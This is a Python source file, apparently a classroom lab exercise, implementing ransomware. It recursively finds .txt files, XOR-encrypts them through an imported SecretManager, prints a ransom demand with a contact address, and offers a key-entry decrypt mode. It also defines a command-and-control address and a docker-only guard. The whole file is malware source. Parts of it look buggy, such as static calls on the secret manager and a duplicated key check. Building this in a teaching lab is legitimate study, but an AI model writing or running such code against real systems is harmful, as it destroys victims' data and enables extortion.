import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to badguy@verybad.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}",hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter
        txt_files = list(Path().rglob(filter)) #when call the function, put the termination ex: ".*txt"
        
        return txt_files

    def encrypt(self):
        # main function for encrypting (see PDF)
        files = self.get_files("*.txt")
        # Load cryptographic elements 

        SecretManager().setup()

        # Encrypt files
        SecretManager.xorfiles(files)

        # Display message to victim
        print("YOUR FILES HAS BEEN STOLEN, SEND US BITCOINS FOR RECEIVE THE KEY.")
        print("Token: {}".format(SecretManager.get_hex_token()))
        print("Contact: badguy@verybad.com")
        

    def decrypt(self):
        # main function for decrypting (see PDF)
        secret = SecretManager(TOKEN_PATH)
        secret.load()
        secret.setup()

        txt_files = self.get_files("*.txt")
        while True:
            try:
                key = input("Enter your key to get your files: ") #demands the key to decrypt
                secret.set_key(key)
                secret.xorfiles(txt_files)
                secret.clean()
                if secret.set_key(key) == 1:
                    print("Successfully decrypted")
                    break
            except ValueError:
                print("Wrong key, try again")


        
  
if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()
